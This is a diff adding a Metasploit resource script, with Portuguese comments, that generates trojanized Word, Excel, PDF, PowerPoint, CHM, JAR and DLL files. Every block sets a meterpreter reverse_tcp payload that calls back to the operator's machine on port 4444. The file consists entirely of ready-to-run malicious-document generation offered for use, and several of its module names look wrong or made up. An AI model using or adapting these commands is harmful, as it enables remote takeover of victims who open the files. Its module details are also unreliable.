@@ -1,0 +1,55 @@
+# Criar payload para arquivo Word (.doc)
+use exploit/windows/fileformat/office_word_hta
+set FILENAME payload_word.doc
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <SEU_IP_LOCAL>
+set LPORT 4444
+exploit -j -z
+
+# Criar payload para arquivo Excel (.xls)
+use exploit/windows/fileformat/office_excel_macro
+set FILENAME payload_excel.xls
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <SEU_IP_LOCAL>
+set LPORT 4444
+exploit -j -z
+
+# Criar payload para arquivo PDF (.pdf)
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+set FILENAME payload_pdf.pdf
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <SEU_IP_LOCAL>
+set LPORT 4444
+exploit -j -z
+
+# Criar payload para arquivo PowerPoint (.ppt)
+use exploit/windows/fileformat/office_ppsx_macro
+set FILENAME payload_powerpoint.ppsx
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <SEU_IP_LOCAL>
+set LPORT 4444
+exploit -j -z
+
+# Criar payload para arquivo CHM (.chm)
+use exploit/windows/fileformat/chm
+set FILENAME payload_chm.chm
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <SEU_IP_LOCAL>
+set LPORT 4444
+exploit -j -z
+
+# Criar payload para arquivo JAR (.jar)
+use exploit/multi/browser/java_jre17_exec
+set PAYLOAD java/meterpreter/reverse_tcp
+set LHOST <SEU_IP_LOCAL>
+set LPORT 4444
+exploit -j -z
+
+# Criar payload para arquivo Executável (.exe)
+use exploit/windows/dll_hijacker
+set DLL payload.dll
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <SEU_IP_LOCAL>
+set LPORT 4444
+exploit -j -z
+
